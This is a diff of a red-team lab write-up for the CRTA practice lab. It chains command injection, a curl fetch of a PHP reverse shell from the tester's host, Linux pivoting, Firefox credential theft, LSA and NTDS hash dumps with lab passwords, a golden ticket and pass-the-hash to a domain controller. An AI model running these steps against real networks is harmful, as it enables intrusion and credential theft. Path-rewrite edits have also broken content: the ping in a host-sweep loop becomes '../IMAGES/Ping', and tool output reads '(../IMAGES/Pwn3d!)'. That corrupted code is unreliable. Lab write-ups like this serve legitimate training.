@@ -1,6 +1,6 @@
 Welcome to the CRTA Lab Writeup, this is the 30-day lab CyberWarfareLabs provide for you to practice for the CRTA exam, I'll treat this one lab as many CTFs I've done previously so if you haven't read any of my Writeups, I encourage you to do so, think of this lab as a red team engagement, we got a scope we must follow in this lab as we would in a real red team engagement, let's check the scope:
 
-![Pasted image 20250919150856.png](../../IMAGES/Pasted%20image%2020250919150856.png)
+![Pasted image 20250919150856.png](../IMAGES/Pasted%20image%2020250919150856.png)
 
 Knowing the scope, we can begin.
 
@@ -30,11 +30,11 @@ We found `192.168.80.10`, let's scan the host now then:
 
 So now we know we're facing a web application on this host, let's take a look at it:
 
-![Pasted image 20250919150900.png](../../IMAGES/Pasted%20image%2020250919150900.png)
+![Pasted image 20250919150900.png](../IMAGES/Pasted%20image%2020250919150900.png)
 
 This is an `E-commerce` web application, we can create accounts so let's do it:
 
-![Pasted image 20250919150906.png](../../IMAGES/Pasted%20image%2020250919150906.png)
+![Pasted image 20250919150906.png](../IMAGES/Pasted%20image%2020250919150906.png)
 
 
 ```
@@ -44,25 +44,25 @@ testacc / testacc123
 
 Once we login, we can see this:
 
-![Pasted image 20250919150911.png](../../IMAGES/Pasted%20image%2020250919150911.png)
+![Pasted image 20250919150911.png](../IMAGES/Pasted%20image%2020250919150911.png)
 
 We got some functionalities here such as a search bar, if we go to `career`, we can also see an upload functionality:
 
-![Pasted image 20250919151008.png](../../IMAGES/Pasted%20image%2020250919151008.png)
+![Pasted image 20250919151008.png](../IMAGES/Pasted%20image%2020250919151008.png)
 
 Let's test the search bar and the upload functionality, if we test for XSS on the search bar, we notice no reflection is made on the source code of the page:
 
-![Pasted image 20250919151013.png](../../IMAGES/Pasted%20image%2020250919151013.png)
+![Pasted image 20250919151013.png](../IMAGES/Pasted%20image%2020250919151013.png)
 
 So XSS may not be our way here, let's go with the upload functionality, if site isn't properly coded, it could accept other files such as `php` files which would get us RCE, let's test uploading a webshell:
 
-![Pasted image 20250919151016.png](../../IMAGES/Pasted%20image%2020250919151016.png)
+![Pasted image 20250919151016.png](../IMAGES/Pasted%20image%2020250919151016.png)
 
-![Pasted image 20250919151021.png](../../IMAGES/Pasted%20image%2020250919151021.png)
+![Pasted image 20250919151021.png](../IMAGES/Pasted%20image%2020250919151021.png)
 
 We need to upload `.zip`, `.pdf` or `.docx` files, knowing that it accepts `.zip` files, we could try the `zip polyglot` technique, I used this technique back on a HacktheBox machine, let's take a look at it:
 
-![Pasted image 20250919151027.png](../../IMAGES/Pasted%20image%2020250919151027.png)
+![Pasted image 20250919151027.png](../IMAGES/Pasted%20image%2020250919151027.png)
 
 But, before we even try this, let's create a simple zip file and check how the app behaves when uploading this file:
 
@@ -73,14 +73,14 @@ zip benign.zip test.txt
 
 If we try uploading the file, we get an error:
 
-![Pasted image 20250919151032.png](../../IMAGES/Pasted%20image%2020250919151032.png)
+![Pasted image 20250919151032.png](../IMAGES/Pasted%20image%2020250919151032.png)
 
 We get `Failed to Upload File`, trying to upload a `docx` or `.pdf` file brings up the same alert:
 
-![Pasted image 20250919151037.png](../../IMAGES/Pasted%20image%2020250919151037.png)
+![Pasted image 20250919151037.png](../IMAGES/Pasted%20image%2020250919151037.png)
 
 
-![Pasted image 20250919151041.png](../../IMAGES/Pasted%20image%2020250919151041.png)
+![Pasted image 20250919151041.png](../IMAGES/Pasted%20image%2020250919151041.png)
 
 
 So it seems like the upload functionality is broken, this isn't our way in, what can we do then?
@@ -131,30 +131,30 @@ fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration:
 
 We found some files, for example the `os.php` one seems weird, let's check it up:
 
-![Pasted image 20250919151047.png](../../IMAGES/Pasted%20image%2020250919151047.png)
+![Pasted image 20250919151047.png](../IMAGES/Pasted%20image%2020250919151047.png)
 
 If we enter our email and subscribe, we notice a new URL format is created:
 
-![Pasted image 20250919151050.png](../../IMAGES/Pasted%20image%2020250919151050.png)
+![Pasted image 20250919151050.png](../IMAGES/Pasted%20image%2020250919151050.png)
 
 
 The URL goes in the format of `os.php?EMAIL=email`, if this isn't properly sanitized, we could test some stuff such as SSTI, SSRF, XSS, SQLI or even command injection, let's test these stuff:
 
-![Pasted image 20250919151054.png](../../IMAGES/Pasted%20image%2020250919151054.png)
+![Pasted image 20250919151054.png](../IMAGES/Pasted%20image%2020250919151054.png)
 
-![Pasted image 20250919151137.png](../../IMAGES/Pasted%20image%2020250919151137.png)
+![Pasted image 20250919151137.png](../IMAGES/Pasted%20image%2020250919151137.png)
 
-![Pasted image 20250919151141.png](../../IMAGES/Pasted%20image%2020250919151141.png)
+![Pasted image 20250919151141.png](../IMAGES/Pasted%20image%2020250919151141.png)
 
-![Pasted image 20250919151147.png](../../IMAGES/Pasted%20image%2020250919151147.png)
+![Pasted image 20250919151147.png](../IMAGES/Pasted%20image%2020250919151147.png)
 
 OS command injection works here, seems like the endpoint isn't properly encoded at all, we can even exploit this without using pipes `|`:
 
-![Pasted image 20250919151151.png](../../IMAGES/Pasted%20image%2020250919151151.png)
+![Pasted image 20250919151151.png](../IMAGES/Pasted%20image%2020250919151151.png)
 
 Since this endpoint is some kind of simulation of the `subscribe to the newsletter` functionality on the main page, we could check if the OS command injection exists there too:
 
-![Pasted image 20250919151154.png](../../IMAGES/Pasted%20image%2020250919151154.png)
+![Pasted image 20250919151154.png](../IMAGES/Pasted%20image%2020250919151154.png)
 
 To be honest, I don't know if the `os.php` endpoint is one created by users on the lab or is intended by `CyberWarfareLabs`, I will proceed believing that the endpoint is created by users so the exploit on the main page should be the intended way, let's proceed to exploitation.
 
@@ -170,7 +170,7 @@ curl+http://CHANGE_WITH_YOUR_IP:8000/shell.php+-O+shell.php
 
 If we check our python server, we're able to see the server downloaded our file:
 
-![Pasted image 20250919151159.png](../../IMAGES/Pasted%20image%2020250919151159.png)
+![Pasted image 20250919151159.png](../IMAGES/Pasted%20image%2020250919151159.png)
 
 Our reverse shell file should now be available at:
 
@@ -180,7 +180,7 @@ http://192.168.80.10/shell.php
 
 Set up a listener and access that URL, you should see a connection being made to your machine:
 
-![Pasted image 20250919151203.png](../../IMAGES/Pasted%20image%2020250919151203.png)
+![Pasted image 20250919151203.png](../IMAGES/Pasted%20image%2020250919151203.png)
 
 
 # PIVOTING AND PRIVILEGE ESCALATION
@@ -188,11 +188,11 @@ Set up a listener and access that URL, you should see a connection being made to
 
 Time to start our pivoting, checking another interfaces showcase an `ens34` interface:
 
-![Pasted image 20250919151209.png](../../IMAGES/Pasted%20image%2020250919151209.png)
+![Pasted image 20250919151209.png](../IMAGES/Pasted%20image%2020250919151209.png)
 
 We can also find this information by running linpeas:
 
-![Pasted image 20250919151213.png](../../IMAGES/Pasted%20image%2020250919151213.png)
+![Pasted image 20250919151213.png](../IMAGES/Pasted%20image%2020250919151213.png)
 
 We found the credentials for `privilege`, let's switch to ssh then:
 
@@ -200,13 +200,13 @@ We found the credentials for `privilege`, let's switch to ssh then:
 privilege / Admin@962
 ```
 
-![Pasted image 20250919151216.png](../../IMAGES/Pasted%20image%2020250919151216.png)
+![Pasted image 20250919151216.png](../IMAGES/Pasted%20image%2020250919151216.png)
 
 Let's find live hosts on this interface, we can use the following bash command for it:
 
 ```bash
 for ip in {1..254}; do 
-    (../../IMAGES/Ping -c 1 -W 1 192.168.98.$ip | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1) &
+    (../IMAGES/Ping -c 1 -W 1 192.168.98.$ip | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1) &
 done | grep -v '^\[.*\]$'
 ```
 
@@ -214,7 +214,7 @@ Once we use the command, we get the following:
 
 ```
 www-data@ubuntu-virtual-machine:/tmp$ for ip in {1..254}; do 
->     (../../IMAGES/Ping -c 1 -W 1 192.168.98.$ip | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1) &
+>     (../IMAGES/Ping -c 1 -W 1 192.168.98.$ip | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1) &
 > done | grep -v '^\[.*\]$'
 192.168.98.2
 192.168.98.15
@@ -224,7 +224,7 @@ www-data@ubuntu-virtual-machine:/tmp$ for ip in {1..254}; do
 
 This is where the real fun begins, we will use `ligolo` to pivot the entire network, let's do the following, I'll use an example from the `fullhouse` prolab on hackthebox in which I did the same:
 
-![Pasted image 20250919151221.png](../../IMAGES/Pasted%20image%2020250919151221.png)
+![Pasted image 20250919151221.png](../IMAGES/Pasted%20image%2020250919151221.png)
 
 So, let's do the same, first of all, make sure to get the agent so we can use it on the reverse shell session:
 
@@ -291,13 +291,13 @@ session
 start
 ```
 
-![Pasted image 20250919151233.png](../../IMAGES/Pasted%20image%2020250919151233.png)
+![Pasted image 20250919151233.png](../IMAGES/Pasted%20image%2020250919151233.png)
 
-![Pasted image 20250919151236.png](../../IMAGES/Pasted%20image%2020250919151236.png)
+![Pasted image 20250919151236.png](../IMAGES/Pasted%20image%2020250919151236.png)
 
 Ok, we got our tunnel, let's ping one of the live hosts we found:
 
-![Pasted image 20250919151240.png](../../IMAGES/Pasted%20image%2020250919151240.png)
+![Pasted image 20250919151240.png](../IMAGES/Pasted%20image%2020250919151240.png)
 
 Nice, we have internet connection, let's use rustscan or nmap to find open services on each host we found, let's do it:
 
@@ -398,17 +398,17 @@ nmap -sC -sV --min-rate 5000 -Pn -p- -iL hosts.txt -vvv
 
 `192.168.98.15` is the machine we already pwned so no need to focus on it for now, we'll only go back to our ssh session in case we missed something, let's check the other hosts, for example the `192.168.98.2` machine which seems to be the domain controller, got the port `5357` open hosting a web application, let's check:
 
-![Pasted image 20250919151249.png](../../IMAGES/Pasted%20image%2020250919151249.png)
+![Pasted image 20250919151249.png](../IMAGES/Pasted%20image%2020250919151249.png)
 
 It says service unavailable, the one at `.30` contains the same web application, let's check if we can access it:
 
-![Pasted image 20250919151252.png](../../IMAGES/Pasted%20image%2020250919151252.png)
+![Pasted image 20250919151252.png](../IMAGES/Pasted%20image%2020250919151252.png)
 
 Same as the other one, let's keep digging, we can see `smb` enabled on all the hosts but anonymous login doesn't work on any host, what can we do then, what are we missing?
 
 If we recall correctly, we only ran linpeas on the reverse shell but not on the ssh session, since we switched users, it could be worth to run the scan again and check if we missed anything:
 
-![Pasted image 20250919151307.png](../../IMAGES/Pasted%20image%2020250919151307.png)
+![Pasted image 20250919151307.png](../IMAGES/Pasted%20image%2020250919151307.png)
 
 Some new `.sqlite` files can be found inside of the Mozilla Firefox directory, this didn't appear on the previous scan due to this directory being exclusive to the `privilege` user, let's check these files and check if some credentials can be found here:
 
@@ -514,7 +514,7 @@ SMB         192.168.98.2    445    DC01             [*] Windows 10 / Server 2019
 SMB         192.168.98.30   445    MGMT             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:False)
 SMB         192.168.98.2    445    DC01             [-] warfare.corp\john:User1@#$%6 STATUS_LOGON_FAILURE
 SMB         192.168.98.120  445    CDC              [*] Windows 10 / Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:True) (SMBv1:False)
-SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\john:User1@#$%6 (../../IMAGES/Pwn3d!)
+SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\john:User1@#$%6 (../IMAGES/Pwn3d!)
 SMB         192.168.98.120  445    CDC              [+] child.warfare.corp\john:User1@#$%6 
 SMB         192.168.98.120  445    CDC              [*] Enumerated shares
 SMB         192.168.98.120  445    CDC              Share           Permissions     Remark
@@ -532,14 +532,14 @@ SMB         192.168.98.30   445    MGMT             C$              READ,WRITE  
 SMB         192.168.98.30   445    MGMT             IPC$            READ            Remote IPC
 ```
 
-![Pasted image 20250919151326.png](../../IMAGES/Pasted%20image%2020250919151326.png)
+![Pasted image 20250919151326.png](../IMAGES/Pasted%20image%2020250919151326.png)
 
-The `(../../IMAGES/Pwn3d!)` message on `192.168.98.30` is huge for us, it means this user has  administrative level access to the host, we can confirm this by running the `whoami /all` command using `nxc` on the host with this credentials:
+The `(../IMAGES/Pwn3d!)` message on `192.168.98.30` is huge for us, it means this user has  administrative level access to the host, we can confirm this by running the `whoami /all` command using `nxc` on the host with this credentials:
 
 ```bash
 nxc smb 192.168.98.30 -u 'john' -p 'User1@#$%6' -x "whoami /all"
 SMB         192.168.98.30   445    MGMT             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:False) 
-SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\john:User1@#$%6 (../../IMAGES/Pwn3d!)
+SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\john:User1@#$%6 (../IMAGES/Pwn3d!)
 SMB         192.168.98.30   445    MGMT             [+] Executed command via wmiexec
 SMB         192.168.98.30   445    MGMT             USER INFORMATION
 SMB         192.168.98.30   445    MGMT             ----------------
@@ -592,20 +592,20 @@ SMB         192.168.98.30   445    MGMT             User claims unknown.
 SMB         192.168.98.30   445    MGMT             Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
-![Pasted image 20250919151335.png](../../IMAGES/Pasted%20image%2020250919151335.png)
+![Pasted image 20250919151335.png](../IMAGES/Pasted%20image%2020250919151335.png)
 
 On here we can do everything on the host, we can dump the SAM for the local machine but that would be useless since we need to pivot to other hosts, let's do another thing, we can dump the LSASecrets which may contain service account passwords, we can use nxc for this task too, check the following article for more info on this technique:
 
 https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/credential-dumping/lsa-secrets
 
-![Pasted image 20250919151339.png](../../IMAGES/Pasted%20image%2020250919151339.png)
+![Pasted image 20250919151339.png](../IMAGES/Pasted%20image%2020250919151339.png)
 
 Let's reproduce it then:
 
 ```bash
 nxc smb 192.168.98.30 -u 'john' -p 'User1@#$%6' --lsa
 SMB         192.168.98.30   445    MGMT             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:False) 
-SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\john:User1@#$%6 (../../IMAGES/Pwn3d!)
+SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\john:User1@#$%6 (../IMAGES/Pwn3d!)
 SMB         192.168.98.30   445    MGMT             [+] Dumping LSA secrets
 SMB         192.168.98.30   445    MGMT             CHILD.WARFARE.CORP/john:$DCC2$10240#john#9855312d42ee254a7334845613120e61: (2025-01-17 14:47:56)
 SMB         192.168.98.30   445    MGMT             CHILD.WARFARE.CORP/corpmngr:$DCC2$10240#corpmngr#7fd50bbab99e8ea7ae9c1899f6dea7c6: (2025-03-26 13:20:52)
@@ -632,17 +632,17 @@ SMB         192.168.98.2    445    DC01             [*] Windows 10 / Server 2019
 SMB         192.168.98.120  445    CDC              [*] Windows 10 / Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:True) (SMBv1:False) 
 SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\corpmngr:User4&*&* 
 SMB         192.168.98.2    445    DC01             [-] warfare.corp\corpmngr:User4&*&* STATUS_LOGON_FAILURE 
-SMB         192.168.98.120  445    CDC              [+] child.warfare.corp\corpmngr:User4&*&* (../../IMAGES/Pwn3d!)
+SMB         192.168.98.120  445    CDC              [+] child.warfare.corp\corpmngr:User4&*&* (../IMAGES/Pwn3d!)
 ```
 
-![Pasted image 20250919151350.png](../../IMAGES/Pasted%20image%2020250919151350.png)
+![Pasted image 20250919151350.png](../IMAGES/Pasted%20image%2020250919151350.png)
 
 Now we got administrative level permissions on the `192.168.98.120` host, we could try dumping the secrets again and check if we got anything:
 
 ```bash
 nxc smb 192.168.98.120 -u 'corpmngr' -p 'User4&*&*' --lsa
 SMB         192.168.98.120  445    CDC              [*] Windows 10 / Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:True) (SMBv1:False) 
-SMB         192.168.98.120  445    CDC              [+] child.warfare.corp\corpmngr:User4&*&* (../../IMAGES/Pwn3d!)
+SMB         192.168.98.120  445    CDC              [+] child.warfare.corp\corpmngr:User4&*&* (../IMAGES/Pwn3d!)
 SMB         192.168.98.120  445    CDC              [+] Dumping LSA secrets
 SMB         192.168.98.120  445    CDC              CHILD\CDC$:aes256-cts-hmac-sha1-96:73ca8d8c00cdbb552663b8ef06d1c02745a1d01ee551b3082e7bd5f4e5240618
 SMB         192.168.98.120  445    CDC              CHILD\CDC$:aes128-cts-hmac-sha1-96:c32b293d8c494a0ac5e2eb0c8c47c5ec
@@ -655,7 +655,7 @@ dpapi_userkey:0xf349f2325f7dbc9b6817f715c717c000d630d206
 
 Nothing here, what can we do then to pivot onto the parent DC, we already got admin level permissions on the child DC right, we could abuse this to forge a golden ticket, if you don't know what a golden ticket is, read the following short explanation:
 
-![Pasted image 20250919151355.png](../../IMAGES/Pasted%20image%2020250919151355.png)
+![Pasted image 20250919151355.png](../IMAGES/Pasted%20image%2020250919151355.png)
 
 Ok, let's perform the golden ticket attack, first of all, let's add both DCs and domains to /etc/hosts:
 
@@ -672,7 +672,7 @@ Now that we have everything in order, let's use `nxc` to dump us the NLTM hash o
 nxc smb 192.168.98.120 -u 'corpmngr' -p 'User4&*&*' --ntds
 [!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y
 SMB         192.168.98.120  445    CDC              [*] Windows 10 / Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:True) (SMBv1:False) 
-SMB         192.168.98.120  445    CDC              [+] child.warfare.corp\corpmngr:User4&*&* (../../IMAGES/Pwn3d!)
+SMB         192.168.98.120  445    CDC              [+] child.warfare.corp\corpmngr:User4&*&* (../IMAGES/Pwn3d!)
 SMB         192.168.98.120  445    CDC              [+] Dumping the NTDS, this could take a while so go grab a redbull...
 SMB         192.168.98.120  445    CDC              Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf80de6600b6cd84f8ac65fb7b7c9188:::
 SMB         192.168.98.120  445    CDC              Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -694,7 +694,7 @@ Even though we got the NLTM hash, we need another type of hash, we need the AES2
 
 https://drsuresh.net/articles/kerberos2023
 
-![Pasted image 20250919151403.png](../../IMAGES/Pasted%20image%2020250919151403.png)
+![Pasted image 20250919151403.png](../IMAGES/Pasted%20image%2020250919151403.png)
 
 We can use `secretsdump.py` to get it:
 
@@ -866,7 +866,7 @@ I've corrected this issue on the writeup so this is the explanation on why you c
 
 After the little talk about the hosts issue, once we use the command, we get the ticket:
 
-![Pasted image 20250919151415.png](../../IMAGES/Pasted%20image%2020250919151415.png)
+![Pasted image 20250919151415.png](../IMAGES/Pasted%20image%2020250919151415.png)
 
 Let's set the Kerberos cache:
 
@@ -913,7 +913,7 @@ We finally got our NTLM hash from the Administrator on the Parent DC, let's use 
 evil-winrm -i 192.168.98.2 -u Administrator -H 'a2f7b77b62cd97161e18be2ffcfdfd60'
 ```
 
-![Pasted image 20250919151420.png](../../IMAGES/Pasted%20image%2020250919151420.png)
+![Pasted image 20250919151420.png](../IMAGES/Pasted%20image%2020250919151420.png)
 
-![Pasted image 20250919151426.png](../../IMAGES/Pasted%20image%2020250919151426.png)
+![Pasted image 20250919151426.png](../IMAGES/Pasted%20image%2020250919151426.png)
 
